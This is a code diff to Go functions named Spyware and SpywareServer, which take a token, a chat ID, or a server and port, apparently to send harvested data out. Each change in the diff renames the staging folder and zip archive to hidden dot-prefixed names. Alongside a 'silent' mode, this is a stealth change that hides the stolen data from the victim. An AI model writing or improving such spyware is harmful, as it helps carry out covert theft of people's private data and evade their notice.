@@ -42,7 +42,7 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 	}
 
 	// Create temp directory in current working directory
-	tempDir := filepath.Join(cwd, "liner_data")
+	tempDir := filepath.Join(cwd, ".liner_data")
 	if err := os.MkdirAll(tempDir, 0755); err != nil {
 		if !silent {
 			fmt.Printf("%s[WARNING]%s Failed to create temp directory%s\n", ColorYellow, ColorWhite, ColorReset)
@@ -129,7 +129,7 @@ func Spyware(dumpType, token, chatID string, silent bool) error {
 	if !silent {
 		fmt.Printf("%s[INFO]%s Zipping files...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
-	zipFile := filepath.Join(cwd, "liner_data.zip")
+	zipFile := filepath.Join(cwd, ".liner_data.zip")
 	if err := createZipFile(tempDir, zipFile); err != nil {
 		if !silent {
 			fmt.Printf("%s[WARNING]%s Failed to create zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
@@ -288,7 +288,7 @@ func SpywareServer(dumpType, server, port, encryption string, silent bool) error
 	}
 
 	// Create temp directory in current working directory
-	tempDir := filepath.Join(cwd, "liner_data")
+	tempDir := filepath.Join(cwd, ".liner_data")
 	if err := os.MkdirAll(tempDir, 0755); err != nil {
 		if !silent {
 			fmt.Printf("%s[WARNING]%s Failed to create temp directory%s\n", ColorYellow, ColorWhite, ColorReset)
@@ -375,7 +375,7 @@ func SpywareServer(dumpType, server, port, encryption string, silent bool) error
 	if !silent {
 		fmt.Printf("%s[INFO]%s Zipping files...%s\n", ColorGreen, ColorWhite, ColorReset)
 	}
-	zipFile := filepath.Join(cwd, "liner_data.zip")
+	zipFile := filepath.Join(cwd, ".liner_data.zip")
 	if err := createZipFile(tempDir, zipFile); err != nil {
 		if !silent {
 			fmt.Printf("%s[WARNING]%s Failed to create zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
